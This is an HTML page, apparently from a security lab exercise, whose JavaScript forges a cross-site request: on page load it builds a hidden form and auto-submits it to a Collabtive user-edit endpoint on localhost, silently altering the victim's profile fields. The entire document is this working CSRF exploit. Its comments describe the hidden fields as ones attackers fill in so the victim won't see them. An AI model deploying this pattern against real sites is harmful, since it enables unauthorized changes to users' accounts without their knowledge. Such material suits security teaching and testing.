<html>
<title>
</title>
<body>
<h1>
This page forges an HTTP POST request.
</h1>
<script type="text/javascript">
function post(url,fields) {
   //create a <form> element.
   var p = document.createElement('form');
   //construct the form
   p.action = url;
   p.innerHTML = fields;
   p.target = 'self';
   p.method = 'post';
   //append the form to the current page.
   document.body.appendChild(p);
   //submit the form
   p.submit();
}

function csrf_hack() {
var fields;
   // The following are form entries that need to be filled out
   //     by attackers. The entries are made hidden, so the victim
   //     won't be able to see them.
  //  fields += "<input type='hidden' name='name' value='notbob' />";
  //  fields += "<input type='hidden' name='gender' value='female' />";
   fields += "<input type='hidden' name='location' value='seed' />";
   post('http://localhost/CSRF/Collabtive/manageuser.php?action=edit',fields);
}
// invoke csrf_hack() after the page is loaded.
window.onload = function() { csrf_hack(); }
</script>
</body>
</html>
